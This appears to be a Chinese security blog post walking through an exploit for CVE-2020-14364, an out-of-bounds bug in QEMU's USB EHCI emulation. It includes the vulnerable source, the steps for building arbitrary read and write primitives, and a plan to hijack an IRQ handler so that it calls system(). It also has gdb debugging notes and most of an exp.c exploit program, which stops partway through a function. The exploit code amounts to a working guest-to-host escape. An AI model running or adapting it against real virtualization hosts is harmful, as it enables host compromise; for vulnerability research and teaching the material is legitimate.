<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_token_out</span><span class="params">(USBDevice *s, USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            <span class="comment">/* transfer OK */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* ignore additional output */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            <span class="keyword">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h3><ol>
<li>通过<code>do_token_setup</code>设置越界长度setup_len为<code>0x1010</code></li>
<li>越界写将<code>setup_len</code>设置为<code>0x1010</code>,<code>setup_index</code>设置为<code>0xfffffff8-0x1010</code>，开始setup_index为0，因此第一次copy可以覆写到setup_len和setup_index，第二次copy的时候<code>setup_index=-8</code>,<code>len=0x1018</code>，故可以拷贝覆写<code>setup_buf[8]</code></li>
<li>覆写<code>setup_buf[0]=USB_DIR_IN</code>，将<code>setup_index</code>设置为<code>(target_addr-s-&gt;data_buf)-0x1018</code>，<code>len = s-&gt;setup_len - s-&gt;setup_index</code>得到0x1018，故实际拷贝时<code>s-&gt;setup_index += len</code>得到<code>target_addr-s-&gt;data_buf</code></li>
<li>进行越界读即可读取目标地址的内容</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">            s-&gt;setup_index += len;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    USBPort *port;</span><br><span class="line">    <span class="keyword">char</span> *port_path;</span><br><span class="line">    <span class="keyword">char</span> *serial;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Actual connected speed */</span></span><br><span class="line">    <span class="keyword">int</span> speed;</span><br><span class="line">    <span class="comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span></span><br><span class="line">    <span class="keyword">int</span> speedmask;</span><br><span class="line">    <span class="keyword">uint8_t</span> addr;</span><br><span class="line">    <span class="keyword">char</span> product_desc[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> auto_attach;</span><br><span class="line">    <span class="keyword">bool</span> attached;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int32_t</span> state;</span><br><span class="line">    <span class="keyword">uint8_t</span> setup_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> data_buf[<span class="number">4096</span>];<span class="comment">//拷贝的对象</span></span><br><span class="line">    <span class="keyword">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_state;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_len;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[USB_MAX_ENDPOINTS];</span><br><span class="line">    USBEndpoint ep_out[USB_MAX_ENDPOINTS];</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, USBDescString) strings;</span><br><span class="line">    <span class="keyword">const</span> USBDesc *usb_desc; <span class="comment">/* Overrides class usb_desc if not NULL */</span></span><br><span class="line">    <span class="keyword">const</span> USBDescDevice *device;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> configuration;</span><br><span class="line">    <span class="keyword">int</span> ninterfaces;</span><br><span class="line">    <span class="keyword">int</span> altsetting[USB_MAX_INTERFACES];</span><br><span class="line">    <span class="keyword">const</span> USBDescConfig *config;</span><br><span class="line">    <span class="keyword">const</span> USBDescIface  *ifaces[USB_MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h3><ol>
<li>通过<code>do_token_setup</code>设置越界长度为<code>0x1010</code></li>
<li>越界写将<code>setup_len</code>设置为<code>offset+8</code>,将<code>setup_index</code>则<code>offset-0x1010</code>，copy结束后<code>setup_index=offset</code>，第二次copy的时候<code>len=(offset+8-(offset-0x1010))=0x1018</code>，再拷贝的时候即可对target_qddr进行0x1018长度的拷贝。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">s-&gt;setup_index += len;</span><br></pre></td></tr></table></figure>
<h3 id="整体利用思路"><a href="#整体利用思路" class="headerlink" title="整体利用思路"></a>整体利用思路</h3><ol>
<li>获取USBDevice对象的地址。越界读取dma_buf+0x2004可以得到<code>USBDevice-&gt;remote_wakeup</code>的内容，继续往下读可以读到<code>USBEndpoint ep_ctl</code>，读取其中的<code>dev</code>即可获取到对象的地址，计算偏移就可以获得<code>data_buf</code>和<code>USBPort</code>字段的地址</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> nr;</span><br><span class="line">    <span class="keyword">uint8_t</span> pid;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint8_t</span> ifnum;</span><br><span class="line">    <span class="keyword">int</span> max_packet_size;</span><br><span class="line">    <span class="keyword">int</span> max_streams;</span><br><span class="line">    <span class="keyword">bool</span> pipeline;</span><br><span class="line">    <span class="keyword">bool</span> halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    QTAILQ_HEAD(, USBPacket) <span class="built_in">queue</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>在越界读出来的内容里有一个变量是USBDescDevice *device，可以根据这个变量得到system的地址</li>
<li><ul>
<li>USBDevice 会在 realize 时，调用usb_claim_port，将USBDevice中的port字段设置为指向<br>EHCIState中的ports的地址， 读取USBDevice-&gt;port的内容就能获得EHCIState-&gt;ports 的地址，减去偏移得到 EHCIState的地址。进而得到EHCIState-&gt;irq地址<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usb_claim_port</span><span class="params">(USBDevice *dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    USBBus *bus = usb_bus_from_device(dev);</span><br><span class="line">    USBPort *port;</span><br><span class="line"></span><br><span class="line">    assert(dev-&gt;port == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dev-&gt;port_path) &#123;</span><br><span class="line">        QTAILQ_FOREACH(port, &amp;bus-&gt;<span class="built_in">free</span>, next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(port-&gt;path, dev-&gt;port_path) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (port == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">"usb port %s (bus %s) not found (in use?)"</span>,</span><br><span class="line">                       dev-&gt;port_path, bus-&gt;qbus.name);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (bus-&gt;nfree == <span class="number">1</span> &amp;&amp; <span class="built_in">strcmp</span>(object_get_typename(OBJECT(dev)), <span class="string">"usb-hub"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* Create a new hub and chain it on */</span></span><br><span class="line">            usb_try_create_simple(bus, <span class="string">"usb-hub"</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bus-&gt;nfree == <span class="number">0</span>) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">"tried to attach usb device %s to a bus "</span></span><br><span class="line">                       <span class="string">"with no free ports"</span>, dev-&gt;product_desc);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        port = QTAILQ_FIRST(&amp;bus-&gt;<span class="built_in">free</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    trace_usb_port_claim(bus-&gt;busnr, port-&gt;path);</span><br><span class="line"></span><br><span class="line">    QTAILQ_REMOVE(&amp;bus-&gt;<span class="built_in">free</span>, port, next);</span><br><span class="line">    bus-&gt;nfree--;</span><br><span class="line"></span><br><span class="line">    dev-&gt;port = port;</span><br><span class="line">    port-&gt;dev = dev;</span><br><span class="line"></span><br><span class="line">    QTAILQ_INSERT_TAIL(&amp;bus-&gt;used, port, next);</span><br><span class="line">    bus-&gt;nused++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><ul>
<li>利用任意写将EHCIState-&gt;irq内容填充为伪造的irq地址，将handler 填充成system@plt地址，opaque填充成payload的地址<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    qemu_irq_handler handler;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qemu_set_irq</span><span class="params">(qemu_irq irq, <span class="keyword">int</span> level)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!irq)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h2 id="调试记录"><a href="#调试记录" class="headerlink" title="调试记录"></a>调试记录</h2><p>在Resery师傅的exp上调下233，我这里用的还是前几天的<code>CVE-2019-6788</code>那个qemu的binary。</p>
<ol>
<li><code>diretory /home/wz/qemu</code>导入一下代码文件夹，之后<code>b core.c:204</code>断到<code>do_token_in</code>的<code>usb_packet_copy</code>函数处，第一次的越界读我们读的长度为<code>0x1e00</code>，虽然设置了<code>0x2000</code>的越界长度，但是因为<code>p-&gt;iov.size &lt; len</code>，所以我们最终可以读取的长度为<code>0x1e00</code>，设置的<code>qtd-&gt;bufptr[0] = virtuak_addr_to_physical_addr(data_buf)</code>使得我们读取的结果存放到<code>data_buf=dmabuf + 0x1000</code>处，这里我们读取<code>data_buf[4096]</code>后偏移为0x24的地方，进而计算得到<code>port_addr和data_buf_addr</code></li>
</ol>
<p><img src="/2021/01/09/cve-2020-14364/1.png" alt></p>
<p><img src="/2021/01/09/cve-2020-14364/2.png" alt></p>
<p><img src="/2021/01/09/cve-2020-14364/3.png" alt></p>
<ol start="2">
<li>在越界读偏移为0x4fc处有个程序加载地址相关地址，据此算出<code>proc_base和system@plt</code></li>
</ol>
<p><img src="/2021/01/09/cve-2020-14364/4.png" alt></p>
<ol start="3">
<li>读取<code>port_addr</code>的内容得到<code>port_ptr</code>，根据这个地址可以算出<code>EHCIState_addr和irq_addr</code>，调试过程中比较重要的是偏移，我们可以用<code>p &amp;((struct EHCIState*)0)-&gt;ports</code>得到偏移，这里是<code>0x530</code>，同理可以算出来<code>irq</code></li>
</ol>
<p><img src="/2021/01/09/cve-2020-14364/5.png" alt></p>
<p><img src="/2021/01/09/cve-2020-14364/6.png" alt></p>
<p><img src="/2021/01/09/cve-2020-14364/7.png" alt></p>
<ol start="4">
<li><p>拿伪造的<code>fake_irq</code>覆写原irq的地址，上面布置函数指针和参数地址(<code>在dma_buf上布置</code>)</p>
</li>
<li><p>mmio_write读写触发ehci_update_irq-&gt;qemu_set_irq，执行system函数弹出计算器。</p>
</li>
</ol>
<p><img src="/2021/01/09/cve-2020-14364/8.png" alt></p>
<h2 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h2><p>基本就是resery师傅的exp，偏移略有不同，非常感谢师傅的分享以及解惑。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> <span class="title">USBDevice</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> <span class="title">USBEndpoint</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> nr;</span><br><span class="line">    <span class="keyword">uint8_t</span> pid;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint8_t</span> ifnum;</span><br><span class="line">    <span class="keyword">int</span> max_packet_size;</span><br><span class="line">    <span class="keyword">int</span> max_streams;</span><br><span class="line">    <span class="keyword">bool</span> pipeline;</span><br><span class="line">    <span class="keyword">bool</span> halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    USBEndpoint *fd;</span><br><span class="line">    USBEndpoint *bk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_state;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_len;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[<span class="number">15</span>];</span><br><span class="line">    USBEndpoint ep_out[<span class="number">15</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint characteristics */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> epchar;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint capabilities */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> epcap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> current_qtd;             <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next_qtd;                <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> altnext_qtd;         </span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> token;                   <span class="comment">/* Same as QTD token */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line"></span><br><span class="line">&#125; EHCIqh;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> altnext;                 <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> token;</span><br><span class="line">    <span class="keyword">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line">&#125; EHCIqtd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *setup_buf;</span><br><span class="line"><span class="keyword">char</span> *data_buf;</span><br><span class="line"><span class="keyword">char</span> *data_bufoob;</span><br><span class="line"><span class="keyword">char</span> *first_leak_data;</span><br><span class="line"><span class="keyword">char</span> *second_leak_data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">char</span> *dmabuf;</span><br><span class="line"><span class="keyword">uint32_t</span> *entry;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span> *<span class="title">qh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span> * <span class="title">qtd</span>;</span></span><br><span class="line"><span class="keyword">uint64_t</span> device_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> func_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> port_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> port_ptr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> data_buf_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> proc_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">virtuak_addr_to_physical_addr</span><span class="params">(<span class="keyword">void</span> *addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        perror(<span class="string">"open pagemap"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1u</span>ll &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * pagesize + (<span class="keyword">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echi_reset</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,<span class="number">1</span>&lt;&lt;<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_usbcmd</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    echi_reset();</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,(<span class="number">1</span>&lt;&lt;<span class="number">0</span>)|(<span class="number">1</span>&lt;&lt;<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_portsc</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x64</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x65</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x65</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x66</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x66</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x67</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x67</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x68</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x68</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x69</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x69</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_length</span><span class="params">(<span class="keyword">uint64_t</span> length)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    setup_buf[<span class="number">6</span>] = length &amp; <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = (length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">8</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(setup_buf);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perpare_read</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    setup_buf[<span class="number">0</span>] = <span class="number">0x80</span>;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">8</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(setup_buf);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perpare_write</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    setup_buf[<span 